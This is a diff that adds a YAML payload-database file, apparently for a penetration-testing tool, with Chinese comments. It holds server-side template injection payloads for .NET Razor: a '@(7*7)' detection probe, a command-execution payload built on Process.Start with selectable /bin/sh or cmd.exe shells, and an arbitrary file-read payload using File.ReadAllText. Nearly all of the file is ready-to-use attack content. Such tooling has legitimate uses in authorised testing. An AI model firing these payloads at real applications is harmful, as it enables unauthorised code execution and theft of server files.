@@ -1,0 +1,57 @@
+ruleDB: v0.1.0
+# .NET 侧模板引擎：Razor。
+#
+# Razor 的 @ 引导表达式：@(表达式) 输出值，@{ } 是代码块，@符号名 是隐式表达式。
+
+templates:
+  - id: ssti.dotnet.razor.detect
+    name: Razor 表达式探测
+    desc: "括号里的 C# 表达式会被求值，输出 49 说明模板可控"
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [razor, aspnet]
+    version: "*"
+    body: "@(7*7)"
+    vars: []
+    requires: [template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.dotnet.razor.rce
+    name: Razor 启动进程
+    desc: "花括号代码块里可以直接写 C#。注意这条**不回显命令输出**，只能确认执行；要读回显得把输出写文件再访问"
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [razor, aspnet]
+    version: "*"
+    slots:
+      # 原来写死 /bin/sh，Windows 上的 IIS 目标直接不可用
+      sh:
+        options:
+          - {id: sh,  name: "Linux · /bin/sh -c",   shell: "/bin/sh",  flag: "-c"}
+          - {id: cmd, name: "Windows · cmd.exe /c", shell: "cmd.exe",  flag: "/c"}
+        default: sh
+    body: "@{ System.Diagnostics.Process.Start(\"<<sh.shell>>\", \"<<sh.flag>> <<cmd>>\"); }"
+    vars: [cmd]
+    requires: [template-ctrl]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.dotnet.razor.file.read
+    name: Razor 读文件
+    desc: 用 File.ReadAllText 直接把文件内容回显出来
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [razor, aspnet]
+    version: "*"
+    body: "@(System.IO.File.ReadAllText(\"<<filepath>>\"))"
+    vars: [filepath]
+    requires: [template-ctrl]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
